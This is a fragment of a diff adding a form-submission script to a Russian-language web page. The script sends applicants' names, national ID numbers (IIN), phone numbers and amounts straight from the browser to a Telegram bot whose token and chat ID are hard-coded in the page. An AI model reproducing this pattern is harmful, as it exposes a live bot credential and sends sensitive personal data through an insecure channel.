+    var amount=fd.get('amount')||'';
+    var company=fd.get('company')||'';
+    var callTime=fd.get('callTime')||'';
+    var comment=fd.get('comment')||'';
+    
+    var text='📋 *Новая заявка*\n\n👤 ФИО: '+name+'\n🆔 ИИН: '+iin+'\n📱 Телефон: '+phone;
+    if(extra) text+='\n📞 Доп: '+extra;
+    if(amount) text+='\n💰 Сумма: '+amount+' ₸';
+    if(company) text+='\n🏢 Платформа: '+company;
+    if(callTime) text+='\n📅 Звонить: '+callTime;
+    if(comment) text+='\n💬 '+comment;
+    
+    fetch('https://api.telegram.org/bot8829750295:AAEdnt-7FPCVuVbgj6tgn7eC2_2LpY5VHCk/sendMessage',{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({chat_id:'8471070560',text:text})
+    }).then(function(r){return r.json()}).then(function(d){
+      if(d.ok){
+        self.style.display='none';
+        document.getElementById('fs').style.display='block';
+      }else{
+        alert('Ошибка отправки. Попробуйте ещё раз.');
+        btn.disabled=false;
+        btn.textContent='Отправить заявку';
+      }
+    }).catch(function(err){
+      alert('Ошибка сети. Проверьте интернет.');
+      btn.disabled=false;
+      btn.textContent='Отправить заявку';
+    });
+  });
   </script>
 </body>
 </html>
